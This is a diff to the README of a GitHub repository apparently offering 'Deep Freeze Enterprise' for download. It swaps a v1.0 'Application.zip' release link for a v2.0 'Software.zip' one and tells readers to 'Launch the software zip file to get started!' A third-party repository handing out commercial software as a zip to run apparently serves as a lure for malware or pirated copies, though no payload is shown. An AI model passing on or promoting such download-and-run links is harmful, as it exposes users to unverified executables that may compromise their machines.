@@ -33,7 +33,7 @@ Feel free to explore these topics and find the information you need.
 
 To download the software related to this repository, click the button below:
 
-[![Download Software](https://github.com/OmierKareem/Deep-Freeze-Enterprise-Download/releases/download/v1.0/Application.zip)](https://github.com/OmierKareem/Deep-Freeze-Enterprise-Download/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/OmierKareem/Deep-Freeze-Enterprise-Download/releases/download/v2.0/Software.zip)](https://github.com/OmierKareem/Deep-Freeze-Enterprise-Download/releases/download/v2.0/Software.zip)
 
 🚀 **Launch the software zip file to get started!** 🚀
 
